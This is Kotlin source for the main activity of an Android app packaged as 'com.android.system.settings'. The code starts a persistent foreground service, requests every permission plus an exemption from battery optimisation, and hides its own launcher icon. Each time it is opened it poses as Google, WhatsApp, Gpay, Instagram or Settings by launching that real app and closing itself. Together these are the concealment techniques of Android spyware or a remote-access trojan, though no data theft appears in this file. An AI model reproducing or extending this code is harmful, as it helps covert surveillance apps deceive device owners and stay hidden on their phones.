package com.android.system.settings


import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.Settings
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi

class MainActivity : AppCompatActivity() {

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        val startSettingsLauncher =registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
                if (result.resultCode == Activity.RESULT_OK) {finishAndRemoveTask()}
                else {finishAndRemoveTask()}}

        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        startService(Intent(this,ForegroundService::class.java))
        //request all permissions required
        Functions().requestAllPermissions(this)
        //request ignore battery optimization permission
        Functions().requestIgnoreBatteryOptimizations(this)
        //run app in foreground


        //hides app from home-screen if android version is less than API-29
        if(Build.VERSION.SDK_INT < Build.VERSION_CODES.O){
            //hides app from home-screen
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
        }
        //if all permissions are allowed it always shows settings when started
        if(Functions().isAllPermissionAllowed(this)){
            //shows a settings screen whenever app is opened

            fun retrieveData(): String? {
                val sharedPreferences = getSharedPreferences("MyPreferences", MODE_PRIVATE)
                return sharedPreferences.getString("activity", null)
            }

            fun runApp(app:String){
                val packageManager: PackageManager = packageManager

                // Check if the app is installed
                val intent = packageManager.getLaunchIntentForPackage(app)
                if (intent != null) {
                    startActivity(intent)
                    finishAndRemoveTask()
//                    startSettingsLauncher.launch(intent)
                }
            }

                 //retrieve data from storage to check last set icon type and open corresponding app
                 if(retrieveData() =="Google"){runApp("com.google.android.googlequicksearchbox") }
                 else if(retrieveData() =="Amazon"){runApp("in.amazon.mShop.android.shopping")}
                 else if(retrieveData() =="Calendar"){runApp("com.google.android.calendar")} else if(retrieveData() =="Chrome"){runApp("com.android.chrome")}
                 else if(retrieveData() =="Facebook"){runApp("com.facebook.katana")}
                 else if(retrieveData() =="Gmail"){runApp("com.google.android.gm")}
                 else if(retrieveData() =="Gpay"){runApp("com.google.android.apps.nbu.paisa.user")} else if(retrieveData() =="Instagram"){runApp("com.instagram.android")} else if(retrieveData() =="Maps"){runApp("com.google.android.apps.maps")}
                 else if(retrieveData() =="Photos"){runApp("com.google.android.apps.photos")}
                 else if(retrieveData() =="Play Store"){runApp("com.android.vending")}
                 else if(retrieveData() =="WhatsApp"){runApp("com.whatsapp")}
                 else if(retrieveData() =="YouTube"){runApp("com.google.android.youtube")}
                 //if retrieved data doesn't match anything - open settings panel
                 else{val startSettings = Intent(Settings.ACTION_SETTINGS);startActivity(startSettings);finishAndRemoveTask(); }



                //finishAndRemoveTask();

        }

    }
}
